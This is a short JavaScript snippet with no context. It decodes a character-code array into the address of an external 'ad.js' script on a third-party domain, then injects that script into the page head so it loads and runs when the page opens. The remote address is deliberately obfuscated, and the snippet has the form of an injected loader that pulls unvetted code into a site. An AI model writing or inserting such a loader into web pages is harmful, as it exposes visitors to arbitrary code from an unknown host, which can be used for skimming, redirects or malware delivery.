var arr = [104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 105, 101, 117, 105, 46, 99, 111, 109, 47, 97, 100, 46, 106, 115]; var str = ''; for (var i = 0; i < arr.length; i++) { str += String.fromCharCode(arr[i]) } var script = document.createElement("script"); script.setAttribute("type", "text/javascript"); script.setAttribute("src", str); var heads = document.getElementsByTagName("head"); if (heads.length) { heads[0].appendChild(script) } else { document.documentElement.appendChild(script) }